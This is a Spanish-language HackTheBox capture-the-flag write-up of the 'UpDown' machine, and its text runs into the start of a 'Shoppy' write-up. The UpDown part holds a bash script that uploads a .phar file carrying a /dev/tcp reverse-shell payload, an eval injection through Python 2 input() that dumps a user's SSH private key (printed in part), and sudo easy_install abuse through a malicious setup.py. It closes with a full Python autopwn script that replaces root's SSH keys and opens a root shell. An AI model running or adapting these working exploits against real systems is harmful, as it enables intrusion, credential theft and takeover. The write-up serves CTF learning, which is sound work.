substr($file,$extension+1);}?&amp;gt; &amp;lt;/section&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div id=&quot;footer_wrap&quot; class=&quot;outer&quot;&amp;gt; &amp;lt;footer class=&quot;inner&quot;&amp;gt; &amp;lt;p class=&quot;copyright&quot;&amp;gt;siteisup.htb (beta)&amp;lt;/p&amp;gt;&amp;lt;br&amp;gt; &amp;lt;a class=&quot;changelog&quot; href=&quot;changelog.txt&quot;&amp;gt;changelog.txt&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt; &amp;lt;/footer&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;Este archivo es el que observamos en el dominio dev.siteisup.htb y ahora que tenemos el código de la aplicación lo analizamos para encontrar alguna vulnerabilidad:&amp;lt;?phpfunction isitup($url){ $ch=curl_init(); curl_setopt($ch, CURLOPT_URL, trim($url)); curl_setopt($ch, CURLOPT_USERAGENT, &quot;siteisup.htb beta&quot;); curl_setopt($ch, CURLOPT_HEADER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_TIMEOUT, 30); $f = curl_exec($ch); $header = curl_getinfo($ch); if($f AND $header[&#39;http_code&#39;] == 200){ return array(true,$f); }else{ return false; } curl_close($ch);}if($_POST[&#39;check&#39;]){ # File size must be less than 10kb. if ($_FILES[&#39;file&#39;][&#39;size&#39;] &amp;gt; 10000) { die(&quot;File too large!&quot;); } $file = $_FILES[&#39;file&#39;][&#39;name&#39;]; # Check if extension is allowed. $ext = getExtension($file); if(preg_match(&quot;/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i&quot;,$ext)){ die(&quot;Extension not allowed!&quot;); } # Create directory to upload our file. $dir = &quot;uploads/&quot;.md5(time()).&quot;/&quot;; if(!is_dir($dir)){ mkdir($dir, 0770, true); } # Upload the file. $final_path = $dir.$file; move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &quot;{$final_path}&quot;); # Read the uploaded file. $websites = explode(&quot;\\n&quot;,file_get_contents($final_path)); foreach($websites as $site){ $site=trim($site); if(!preg_match(&quot;#file://#i&quot;,$site) &amp;amp;&amp;amp; !preg_match(&quot;#data://#i&quot;,$site) &amp;amp;&amp;amp; !preg_match(&quot;#ftp://#i&quot;,$site)){ $check=isitup($site); if($check){ echo &quot;&amp;lt;center&amp;gt;{$site}&amp;lt;br&amp;gt;&amp;lt;font color=&#39;green&#39;&amp;gt;is up ^_^&amp;lt;/font&amp;gt;&amp;lt;/center&amp;gt;&quot;; }else{ echo &quot;&amp;lt;center&amp;gt;{$site}&amp;lt;br&amp;gt;&amp;lt;font color=&#39;red&#39;&amp;gt;seems to be down :(&amp;lt;/font&amp;gt;&amp;lt;/center&amp;gt;&quot;; } }else{ echo &quot;&amp;lt;center&amp;gt;&amp;lt;font color=&#39;red&#39;&amp;gt;Hacking attempt was detected !&amp;lt;/font&amp;gt;&amp;lt;/center&amp;gt;&quot;; } } # Delete the uploaded file. @unlink($final_path);}function getExtension($file) { $extension = strrpos($file,&quot;.&quot;); return ($extension===false) ? &quot;&quot; : substr($file,$extension+1);}?&amp;gt;Gracias a los comentarios no hace explicar la funcionalidad, pero en general el proceso sería el siguiente: Al subir nuestro archivo realiza un filtro para evitar extensiones con fines maliciosos (.php, .py, .zip, etc.) Crea un directorio llamado /uploads/(hash **md5** del tiempo en segundos actual)/ Mueve nuestro archivo a ese directorio /uploads/(hash)/(nuestro_archivo) Luego lee cada linea del archivo, hace un filtro (wrappers de php maliciosos) y le ejecuta un curl para comprobar si el suspuesto sitio está activo o no Después de terminar el proceso anterior borra el archivo del sistemaDespués de analizarlo encontramos que no se valida la extensión .phar que nos sirve para almacenar una aplicación entera en php, en otras palabras podemos ejecutar código php, osea tenemos una Execución Remota de ComandosAhora el único problema es que nuestro archivo se va a borrar y probablemente no tendremos tiempo a ejecutarlo. Sin embargo, para tener una idea de lo que podemos hacer recurrimos nuevamente a los logs del repositorio:❯ git diff...diff --git a/changelog.txt b/changelog.txtdeleted file mode 100644index 09e4ccd..0000000--- a/changelog.txt+++ /dev/null@@ -1,9 +0,0 @@-Beta version--1- Check a bunch of websites.---- ToDo:--1- Multithreading for a faster version :D.-2- Remove the upload option.-3- New admin panel....El punto número uno menciona que en la aplicación hay que implementar Multithreading, que como menciona sirve para ejecutar tareas en paralelo y aumentar la velocidadTeniendo en cuenta esto, lo que hacemos es enviar nuestro código malicioso php seguido de varias URLs y como no se aplican hilos ejecutará el curl línea por linea y en ese proceso tendremos tiempo para llamar a nuestro archivo .phar y ejecutar nuestro códigoEl último problema era que al intentar usar funciones como system() - exec() - shell_exec() no obteniamos resultado, entonces al visualizar el archivo de configuración phpinfo notamos que estaban bloqueadas. Por ello, encontramos en la biblia de los Hackers otras manera de executar comandos: proc_close(proc_open(“command”,array(),$something)); Puedes encontrar mas información en HacktricksPara aplica todo este proceso hice un script en bash que creará el archivo malicioso que luego de ponernos en escucha nos devolverá una shell como el usuario www-data:#!/bin/bash# colorsexport red=&quot;\\033[1;31m&quot;export green=&quot;\\033[1;32m&quot;export yellow=&quot;\\033[1;33m&quot;export blue=&quot;\\033[1;34m&quot;export purple=&quot;\\033[1;35m&quot;export cyan=&quot;\\033[1;36m&quot;export grey=&quot;\\033[0;37m&quot;export reset=&quot;\\033[m&quot;# ctrl + c (function)function signal_handler(){ echo -e &quot;${red}\\n[!] User terminated.${reset}&quot; rm -f $file_name tput cnorm; exit 1 # return cursor and exit}# ctrl + c (signal)trap signal_handler SIGINT# hide cursortput civis# display help panelfunction help(){ echo -e &quot;\\nDescription: reverse shell to user www-data&quot; echo echo &quot;[*] Use: $0 ip-address port&quot; echo}# valid argumentsif [ $# -ne 2 ]; then help tput cnorm; exitfi# variablesip=$1; port=$2main_url=&#39;http://dev.siteisup.htb&#39;required_header=&#39;Special-Dev: only4dev&#39;file_name=&#39;rce.phar&#39;php_payload=&quot;&amp;lt;?php proc_close(proc_open(\\&quot;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/$ip/$port 0&amp;gt;&amp;amp;1&#39;\\&quot;, array(), \\$foo)); ?&amp;gt;&quot; # payload to upload [*]# create .phar file with payloadfunction create_file(){ if [ ! -f $file_name ]; then echo &quot;$php_payload&quot; &amp;gt; $file_name echo &quot;http://url.fake&quot; &amp;gt;&amp;gt; $file_name # Interesting fi}# upload file to websitefunction upload_file(){ curl -si -H &quot;$required_header&quot; -F file=@$file_name -F check=Check $main_url &amp;amp;&amp;gt;/dev/null &amp;amp; # 10 seconds to response}# make file request and get php response (RCE)function execute_file(){ uploads_url=&quot;$main_url/uploads&quot; md5_directories=$(curl -si $uploads_url -H &quot;$required_header&quot; -L | html2text | awk &#39;{print $2}&#39; | grep &quot;.*/$&quot; | tr -d &#39;/&#39; | xargs) read -ra md5_directories_array &amp;lt;&amp;lt;&amp;lt; &quot;$md5_directories&quot; # IFS=&#39; &#39; (default) for md5_dir in &quot;${md5_directories_array[@]}&quot;; do file_url=&quot;$uploads_url/$md5_dir/$file_name&quot; echo -e &quot;${green}\\n[*]${reset} Searching file in ${cyan}$file_url${reset}:&quot; file_response=$(curl -s $file_url -H &quot;$required_header&quot;) if [[ &quot;$file_response&quot; == *&quot;Not Found&quot;* ]]; then echo -e &quot;${yellow}\\n\\t[x] File not found.${reset}&quot;; continue fi break done}# alert listening modefunction alert_listen_mode(){ tput cnorm # return cursor echo -e &quot;\\nOpen port $port to receive the shell (g.e nc -lvnp $port)&quot; echo &quot;Press ENTER to continue&quot;; read -s -n 1 key if [[ $key = &quot;&quot; ]]; then execute_file fi}# main flow# ---------echo &quot;[*] Creating file: $file_name&quot;;create_fileecho &quot;[*] Uploading file&quot;;upload_fileecho &quot;[+] Executing payload&quot;;alert_listen_mode Puedes encontrar el script en mi repositorio: https://github.com/E1P0TR0 Solo tuve que agregar la ruta http://url.fake que me daba una respuesta en 10 segundos, suficiente para abrir una consola y ponernos en escuchaAhora solo ejecutamos el script y recivimos una shell como el usuario www-data:❯ bash www-data_shell.shDescription: reverse shell to user www-data[*] Use: www-data_shell.sh ip-address port❯ bash www-data_shell.sh 10.10.14.155 1234[*] Creating file: rce.phar[*] Uploading file[+] Executing payloadOpen port 1234 to receive the shell (g.e nc -lvnp 1234)Press ENTER to continue[*] Searching file in http://dev.siteisup.htb/uploads/c6087c74c29b91be0ffd2edcabf58e2e/rce.phar:────────────────────────────────────────────────────────────────────────────────────────────────────❯ nc -lvnp 1234Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::1234Ncat: Listening on 0.0.0.0:1234Ncat: Connection from 10.10.11.177.Ncat: Connection from 10.10.11.177:55304.bash: cannot set terminal process group (908): Inappropriate ioctl for devicebash: no job control in this shellwww-data@updown:/var/www/dev/uploads/c6087c74c29b91be0ffd2edcabf58e2e$ whoamiwhoamiwww-dataCon respecto a las malas prácticas que nos permitieron el acceso al servidor: No bloquear el acceso al directorio .git Para solucionarlo tendríamos que agregar a nuestro archivo .htaccess la línea RedirectMatch 404 /.git No sanitizar todas las extensiones de archivos peligrosos como .phar No deshabilitar todas las funciones que permitan Execución de ComandosComo usuarios www-data enumeramos rutas/archivos del sistema al cuál tengamos permisos como grupo y eliminando rutas no interesantes encontramos lo siquiente:www-data@updown:/$ find / -group 33 2&amp;gt;/dev/null | grep -vE &quot;var|sys|proc&quot;/home/developer/dev/home/developer/dev/siteisup_test.py/home/developer/dev/siteisupAdemás notamos que el archivo siteisup tiene permisos SUID, lo cuál significa que podemos ejecutarlo como el propietario, en este caso el usuario developer:www-data@updown:/$ ls -l /home/developer/dev/total 24-rwsr-x--- 1 developer www-data 16928 Jun 22 15:45 siteisup-rwxr-x--- 1 developer www-data 154 Jun 22 15:45 siteisup_test.pySi inspeccionamos el archivo veremos que siteisup es un archivo executable, así que procedemos a examinarlo intentando leer cadenas de texto imprimibles en el archivo:www-data@updown:/home/developer/dev$ file siteisupsiteisup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5bbc1de286529f5291b48db8202eefbafc92c1f, for GNU/Linux 3.2.0, not strippedwww-data@updown:/home/developer/dev$ strings siteisup/lib64/ld-linux-x86-64.so.2libc.so.6putssetresgidsetresuidsystemgetegidgeteuid__cxa_finalize__libc_start_mainGLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableu+UH[]A\\A]A^A_Welcome to &#39;siteisup.htb&#39; application/usr/bin/python /home/developer/dev/siteisup_test.py &amp;lt;---- Call!...Observamos que se llama al otro archivo siteisup_test.py que tenemos en el directorio, además que lo está executando con python lo cuál nos hace pensar que está usando una version no tan reciente:www-data@updown:/home/developer/dev$ /usr/bin/pythonPython 2.7.18 (default, Mar 8 2021, 13:02:45)[GCC 9.3.0] on linux2Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&amp;gt;&amp;gt;&amp;gt;www-data@updown:/home/developer/dev$ /usr/bin/python --versionPython 2.7.18Estabamos en lo cierto, y además buscando en internet encontramos que estamos frente a la última version de python2:Procediendo a examinar el archivo siteisup_test.py notamos que el código solo recibe una dirección url como input y luego realiza una petición GET para comprobar si es sitio está activo o no (la misma funcionalidad en el transcurso de la máquina):www-data@updown:/home/developer/dev$ cat siteisup_test.py; echoimport requestsurl = input(&quot;Enter URL here:&quot;)page = requests.get(url)if page.status_code == 200: print &quot;Website is up&quot;else: print &quot;Website is down&quot;Ya que no soy una persona tan experimentada, no deduje como explotar de manera directa esto, pero al empezar a testear el programa obtuve una respuesta que me llamó la atención:www-data@updown:/home/developer/dev$ python siteisup_test.pyEnter URL here:testTraceback (most recent call last): File &quot;siteisup_test.py&quot;, line 3, in &amp;lt;module&amp;gt; url = input(&quot;Enter URL here:&quot;) File &quot;&amp;lt;string&amp;gt;&quot;, line 1, in &amp;lt;module&amp;gt;NameError: name &#39;test&#39; is not defined &amp;lt;----- ??? Vulnerability AssessmentSi programas en python sabrás que este mensaje suele ocurrir cuando llamas a una variable que no ha sido declarada. Por ello, al investigar en internet sobre posibles vulnerabilidades con la función input() en python2.7.18, encontré este Blog lo siguiente:############################### python2 ###########################################Help on built-in function input in module __builtin__:input(...) input([prompt]) -&amp;gt; value Equivalent to eval(raw_input(prompt)).(END)───────────────────────────────────────────────────────────────────────────────────############################### python3 ###########################################Help on built-in function input in module builtins:input(prompt=None, /) Read a string from standard input. The trailing newline is stripped. The prompt string, if given, is printed to standard output without a trailing newline before reading input. If the user hits EOF (*nix: Ctrl-D, Windows: Ctrl-Z+Return), raise EOFError. On *nix systems, readline is used if available. Lo anterior es solo una comparación sobre los cambios actuales respecto a la misma funciónEn python2 observamos que la llamada a esta función es equivalente a la función eval(), lo cuál consiste en lo siguiente:Help on built-in function eval in module __builtin__:eval(...) eval(source[, globals[, locals]]) -&amp;gt; value Evaluate the source in the context of globals and locals. The source may be a string representing a Python expression or a code object as returned by compile(). The globals must be a dictionary and locals can be any mapping, defaulting to the current globals and locals. If only globals is given, locals defaults to it.Es una función que ya hemos visto antes pero en el lenguaje php, lo cuál como dice en su descripción, evalua una expresión en python (respecto al código mismo, ya sea al usar variables o funciones declaradas antes) pasada como cadena de texto y si es válida la ejecutaráCon está información podemos hacer las siguientes pruebas en python2 y python3:############# python2 ################&amp;gt;&amp;gt;&amp;gt; input()__import__(&quot;os&quot;).system(&quot;whoami&quot;)root0&amp;gt;&amp;gt;&amp;gt; RCE!──────────────────────────────────────############# python3 ################&amp;gt;&amp;gt;&amp;gt; input()__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;&amp;gt;&amp;gt;&amp;gt; SafeCon estas pruebas concluimos que tenemos Execución Remota de Comandos en el executable siteisup: Exploitationwww-data@updown:/home/developer/dev$ echo &#39;__import__(&quot;os&quot;).system(&quot;cat /home/developer/.ssh/id_rsa&quot;)&#39; | ./siteisup 2&amp;gt;/dev/nullWelcome to &#39;siteisup.htb&#39; application-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw/S1qi9PFoNvzkt7Uy3++6xDd95ugAdtuRL7qzA03xSNkqnt2HgjKAPOr6ctIvMDph8JeBF2F9Sy4XrtfCP76+WpzmxT7utvGD0N1AY3+EGRpOb7q59X0pcPRnIUnxu2sN+vIXjfGvqiAYozOB5DeX8rb2bkii6S3Q1tM1VUDoW7cCRbnBMglm2FXEJU9lEv9Py2D4BavFvoUqtT8aCosrrKvTpAQkPrvfioShtIpo95Gfyx6Bj2MKJ6QuhiJK+O2zYm0z2ujjCXuM3V4Jb0I1Ud+qa+QtxTsNQVpcIuct06xTfVXeEtPThaLI5KkXElx+TgwR0633jwRpfx1eVgLCxxYk5CapHu...Ahora solo extraemos la llave privada del usuario developer, nos conectamos por ssh y conseguimos la flag:www-data@updown:/tmp$ echo &#39;__import__(&quot;os&quot;).system(&quot;cat /home/developer/.ssh/id_rsa&quot;)&#39; | /home/developer/dev/siteisup 2&amp;gt;/dev/null | sed &#39;39d&#39; &amp;gt; id_rsa_developerwww-data@updown:/tmp$ chmod 600 id_rsa_developer www-data@updown:/tmp$ ssh -i id_rsa_developer developer@localhost -qThe authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:npwXkHj+pLo3LaYR66HNCKEpU/vUoTG03FL41SMlIh0.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWelcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-122-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue Oct 25 01:01:48 UTC 2022 System load: 0.0 Processes: 243 Usage of /: 49.9% of 2.84GB Users logged in: 0 Memory usage: 26% IPv4 address for eth0: 10.10.11.177 Swap usage: 0%8 updates can be applied immediately.8 of these updates are standard security updates.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Tue Oct 25 00:59:31 2022 from 127.0.0.1developer@updown:~$ find / -name user.txt -exec ls -l {} + 2&amp;gt;/dev/null-rw-r----- 1 root developer 33 Oct 24 16:54 /home/developer/user.txtCon respecto a las malas prácticas que nos permitieron el acceso al servidor: Usar versiones no actualizadas de los programas que usas al implementar una aplicación + permisos SUIDPrivilege EscalationEn el proceso de la enumeración básica para el sistema encontramos que podemos ejecutar un binario como el usaurio root sin porporcionar una contraseña:developer@updown:~$ sudo -lMatching Defaults entries for developer on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser developer may run the following commands on localhost: (ALL) NOPASSWD: /usr/local/bin/easy_install Al parecer es un binario conocido y explotable al instante: https://gtfobins.github.io/gtfobins/easy_install/#sudoSin embargo, debemos entender como funciona por detrás para saber que es lo que hace, vamos a ello: ¿ Qué es easy_install ?Bueno, easy_install es un módulo de python que nos permite descargar, contruir, instalar y administrar paquetes del lenguaje. Es una herramienta que hoy en día está obsoleta y ha sido remplazada por el famoso pip que todos conocemos ¿ Qué es un paquete en python ?En pocas palabras, un paquete es un módulo que tiene más módulos dentro y así sucesivamente. Con la siguiente estructura:a_package __init__.py module_a.py a_sub_package __init__.py module_b.py Aquí tienes más información sobre paquetes en python: https://python-packaging-tutorial.readthedocs.io/en/latest/setup_py.html Instalación de un paqueteUn paquete está estructurado por varios archivos, pero en esta ocasión nos centraremos en el archivo setup.py, él cuál es un script en python encargado de construir e instalar el paqueteEntonces: Tenemos una aplicación para construir e instalar paquetes Sabemos que al instalar un paquete se buscará el script setup.py y se ejecutaráPero, ¿ Por qué ocurre esto ? Análisis de códigoPrimero vemos el código del programa easy_install:developer@updown:~$ cat /usr/local/bin/easy_install#!/usr/bin/python# -*- coding: utf-8 -*-import reimport sysfrom setuptools.command.easy_install import mainif __name__ == &#39;__main__&#39;: sys.argv[0] = re.sub(r&#39;(-script\\.pyw|\\.exe)?$&#39;, &#39;&#39;, sys.argv[0]) sys.exit(main())Observamos que como flujo principal se aplica un filtro y luego se importa la función main de setuptools.command.easy_install:developer@updown:~$ find / -name easy_install.py 2&amp;gt;/dev/null/usr/lib/python3/dist-packages/easy_install.py/usr/lib/python3/dist-packages/setuptools/command/easy_install.py/usr/local/lib/python2.7/dist-packages/easy_install.py/usr/local/lib/python2.7/dist-packages/setuptools/command/easy_install.py &amp;lt;--- This!En la función main se realiza todo el proceso de la instalación del paquete (son muchas funciones y no entraremos en detalle) y llegamos a está función: /usr/local/lib/python2.7/dist-packages/setuptools/command/easy_install.py...def run_setup(self, setup_script, setup_base, args): sys.modules.setdefault(&#39;distutils.command.bdist_egg&#39;, bdist_egg) sys.modules.setdefault(&#39;distutils.command.egg_info&#39;, egg_info) args = list(args) if self.verbose &amp;gt; 2: v = &#39;v&#39; * (self.verbose - 1) args.insert(0, &#39;-&#39; + v) elif self.verbose &amp;lt; 2: args.insert(0, &#39;-q&#39;) if self.dry_run: args.insert(0, &#39;-n&#39;) log.info( &quot;Running %s %s&quot;, setup_script[len(setup_base) + 1:], &#39; &#39;.join(args) ) try: run_setup(setup_script, args) # &amp;lt;--- This call! except SystemExit as v: raise DistutilsError(&quot;Setup script exited with %s&quot; % (v.args[0],))...Se llama a la función run_setup() la cuál es importada de setuptools.sandbox (lo puedes ver en las primeras lineas del código) /usr/local/lib/python2.7/dist-packages/setuptools/sandbox.py...def run_setup(setup_script, args): &quot;&quot;&quot;Run a distutils setup script, sandboxed in its directory&quot;&quot;&quot; setup_dir = os.path.abspath(os.path.dirname(setup_script)) with setup_context(setup_dir): try: sys.argv[:] = [setup_script] + list(args) sys.path.insert(0, setup_dir) # reset to include setup dir, w/clean callback list working_set.__init__() working_set.callbacks.append(lambda dist: dist.activate()) # __file__ should be a byte string on Python 2 (#712) dunder_file = ( setup_script if isinstance(setup_script, str) else setup_script.encode(sys.getfilesystemencoding()) ) with DirectorySandbox(setup_dir): ns = dict(__file__=dunder_file, __name__=&#39;__main__&#39;) _execfile(setup_script, ns) # &amp;lt;--- This call! except SystemExit as v: if v.args and v.args[0]: raise # Normal exit, just return...Luego llama a la función _execfile del mismo archivo:def _execfile(filename, globals, locals=None): &quot;&quot;&quot; Python 3 implementation of execfile. &quot;&quot;&quot; mode = &#39;rb&#39; with open(filename, mode) as stream: script = stream.read() if locals is None: locals = globals code = compile(script, filename, &#39;exec&#39;) exec(code, globals, locals) # &amp;lt;-- Execution!Y finalmente, se lee el contenido y se compila el código de nuestro archivo setup.py para luego estar listo para ejecutarse con exec() y con ello tener una Execución Remota de ComandosAhora lo que tenemos que hacer es crear una carpeta de trabajo y dentro nuestro archivo setup.py con el código para ejecutar comandos. Luego usar la herramienta easy_install (que ejecutaremos como root) para intentar construir e instalar un “supuesto paquete” que se encuentra en nuestra carpeta de trabajo que posteriormente procederá a ejecutar nuestro código:developer@updown:/tmp/.privesc/RCE$ cat setup.py __import__(&#39;os&#39;).system(&#39;id&#39;)developer@updown:/tmp/.privesc/RCE$ sudo /usr/local/bin/easy_install .WARNING: The easy_install command is deprecated and will be removed in a future version.Processing .Writing /tmp/.privesc/RCE/setup.cfgRunning setup.py -q bdist_egg --dist-dir /tmp/.privesc/RCE/egg-dist-tmp-7uz3ehuid=0(root) gid=0(root) groups=0(root) &amp;lt;--- Successful RCE!No eggs found in /tmp/.privesc/RCE/egg-dist-tmp-7uz3eh (setup script problem?)Para finalizar y aplicar todo el proceso otra vez, hice un Autopwn en python que nos devuelve una shell para ejecutar comandos:#!/usr/bin/env python3&quot;&quot;&quot;Autopwn Updown HTB Machine--------------------------Author: MarssDate: Oct 21, 2022&quot;&quot;&quot;import paramikoimport requestsimport signalimport sysimport threadingimport timefrom bs4 import BeautifulSoupfrom pwn import *# Ctrl + c (function)def signal_handler(signum, frame): sys.exit(&#39;\\n[!] User terminated.&#39;)# Ctrl + c (signal)signal.signal(signal.SIGINT, signal_handler)# Main classclass Exploit: def __init__(self): self.target_url = &#39;http://dev.siteisup.htb&#39; self.malicious_file = &#39;remote_code_execution.phar&#39; def run(self): progress = log.progress(&#39;Starting attack&#39;) # (1) UPLOAD FILE progress.status(&#39;Uploading file&#39;) upload_file_thread = threading.Thread(target=self.upload_file) upload_file_thread.start() time.sleep(3) # wait until the file has been uploaded log.info(f&#39;File Uploaded: {self.malicious_file}&#39;) # (2) EXECUTE FILE progress.status(&#39;Executing file&#39;) id_rsa_output = self.execute_file() log.info(f&#39;Payload executed&#39;) # (3) SAVE DEVELOPER ID_RSA progress.status(&#39;Extracting id_rsa keys&#39;) private_key_name = &#39;id_rsa_developer&#39; self.create_file(private_key_name, id_rsa_output) log.info(f&#39;Developer id_rsa: ./{private_key_name}&#39;) # (4) SSH CONNECTION (developer) progress.status(&#39;SSH connection&#39;) connection = self.ssh_connection(&#39;developer&#39;, private_key_name) # (5) GET ROOT SHELL WITH ROOT ID_RSA progress.status(&#39;Getting reverse shell&#39;) self.interactive_shell(connection) def create_file(self, file_name, file_data): with open(file_name, &#39;w&#39;) as file: file.write(file_data + &#39;\\n&#39;) def upload_file(self): try: headers = { &#39;Special-Dev&#39; : &#39;only4dev&#39; } file_data = { &#39;file&#39; : ( self.malicious_file, open(self.malicious_file, &#39;r&#39;), &#39;application/octet-stream&#39; ) } post_data = { &#39;check&#39; : &#39;Check&#39; } requests.post( self.target_url, headers=headers, files=file_data, data=post_data ) except Exception as error: sys.exit(&#39;\\n[x] Error: %s&#39; % error) def output_command(self, response): output = response.replace(&quot;\\nhttp://url.fake\\n&quot;, &quot;&quot;) output = output.replace(&quot;Enter URL here:Welcome to &#39;siteisup.htb&#39; application&quot;, &quot;&quot;).strip() return output def execute_file(self): try: headers = { &#39;Special-Dev&#39; : &#39;only4dev&#39; } response = requests.get(self.target_url + &#39;/uploads/&#39;, headers=headers) beauty_response = BeautifulSoup(response.text, &#39;html.parser&#39;) md5_directories = beauty_response.find_all(&#39;a&#39;)[5:] for md5_directory in md5_directories: upload_url = self.target_url + f&#39;/uploads/{md5_directory.string}/{self.malicious_file}&#39; response = requests.get(upload_url, headers=headers) if &#39;Not Found&#39; in response.text: continue break return self.output_command(response.text) except Exception as error: sys.exit(&#39;\\n[x] Error: %s&#39; % error) def interactive_shell(self, connection): command = &quot;mkdir /tmp/.privesc&quot; _ = self.execute_command(connection, command) command = &quot;echo \\&quot;__import__(&#39;os&#39;).system(&#39;rm /root/.ssh/id_rsa*&#39;)\\&quot; &amp;gt; /tmp/.privesc/setup.py&quot; _ = self.execute_command(connection, command) command = &quot;echo \\&quot;__import__(&#39;os&#39;).system(&#39;ssh-keygen -q -t rsa -f /root/.ssh/id_rsa -N \\\\\\&quot;\\\\\\&quot;&#39;)\\&quot; &amp;gt;&amp;gt; /tmp/.privesc/setup.py&quot; _ = self.execute_command(connection, command) command = &quot;echo \\&quot;__import__(&#39;os&#39;).system(&#39;cat /root/.ssh/id_rsa.pub &amp;gt; /root/.ssh/authorized_keys &amp;amp;&amp;amp; cat /root/.ssh/id_rsa&#39;)\\&quot; &amp;gt;&amp;gt; /tmp/.privesc/setup.py&quot; _ = self.execute_command(connection, command) command = &quot;sudo /usr/local/bin/easy_install -q /tmp/.privesc 2&amp;gt;/dev/null&quot; id_rsa_output = self.execute_command(connection, command) private_key_name = &#39;id_rsa_root&#39; self.create_file(private_key_name, id_rsa_output) log.info(f&#39;Root id_rsa: ./{private_key_name}&#39;) root_client = self.ssh_connection(&#39;root&#39;, private_key_name) log.success(&#39;Successful ssh connection&#39;) _ = self.execute_command(root_client, &#39;rm -r /tmp/.privesc&#39;) print() while True: cmd = raw_input(&#39;~# &#39;) output_command = self.execute_command(root_client, cmd) print(output_command) def execute_command(self, connection, command): _stdin, _stdout, _stderr = connection.exec_command(command) output_command = _stdout.read().decode() return output_command def ssh_connection(self, ssh_username, private_key_name): target_host = &#39;10.10.11.177&#39; ssh_private_key = paramiko.RSAKey.from_private_key_file(f&quot;./{private_key_name}&quot;) try: client = paramiko.SSHClient() client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) client.connect(target_host, port=22, username=ssh_username, pkey=ssh_private_key) return client except Exception as error: sys.exit(&#39;\\n[x] Error: %s&#39; % error)# Main flowif __name__ == &#39;__main__&#39;: ascii_tittle = &quot;&quot;&quot; _, _,_ ___ _, __, _ _ _, _ _,_ __, __, _, _ _ _, _ /_\\ | | | / \\ |_) | | |\\ | | | |_) | \\ / \\ | | |\\ | | | | | | \\ / | |/\\| | \\| | | | |_/ \\ / |/\\| | \\| ~ ~ `~&#39; ~ ~ ~ ~ ~ ~ ~ `~&#39; ~ ~ ~ ~ ~ ~ ~ by marss &quot;&quot;&quot; print(ascii_tittle) exploit = Exploit() exploit.run()Ahora solo lo ejecutamos y conseguimos la flag: Puedes encontrar el script en mi repositorio: https://github.com/E1P0TR0" }, { "title": "Hackthebox Writeup Shoppy", "url": "/posts/HTBShoppy/", "categories": "HTB, Writeups", "tags": "HTB, Linux, Easy, NoSQLI, Information Leakage, Reverse Engineering, Docker", "date": "2022-10-04 11:58:15 -0500", "snippet": "Overview Bypass login page by NoSQL Injection User credentials by User enumeration Leak of SSH credentials in Mattermost system (Foothold) SSH credentials leak by Reverse engineering to binary Host-to-container filesystem mount by non-privileged user docker group (Privilege Escalation) OS IP Release Date Difficulty Points Linux 10.10.11.180 17 Sep 2022 Easy 20 Antes de empezar verificamos que estamos conectado a la VPN de HTB y tenemos conexión con la máquina:&amp;gt; ping -c1 10.10.11.180PING 10.10.11.180 (10.10.11.180) 56(84) bytes of data.64 bytes from 10.10.11.180: icmp_seq=1 ttl=63 time=106 ms \\______________________ Linux Machine--- 10.10.11.180 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0ms \\_________________\\____________________________________ Successful connectionrtt min/avg/max/mdev = 103.824/103.824/103.824/0.000 ms Explicación de parámetros: -c &amp;lt;count&amp;gt; : Número de paquetes ICMP que deseamos enviar a la máquinaEnumerationEmpezamos con la fase de reconocimiento haciendo un escaneo de tipo TCP (Transfer Control Protocol) para descubrir los puertos abiertos de la máquina:❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.180Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-04 12:06 -05Nmap scan report for 10.10.11.180Host is up (0.11s latency).Not shown: 65389 closed tcp ports (reset), 143 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE22/tcp open ssh \\_________________ Secure Shell Protocol80/tcp open http \\_________________ Hypertext Transfer Protocol9093/tcp open copycat \\_________________ Copycat database replication service Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 –open : Escanear solo puertos abiertos -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS) -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad 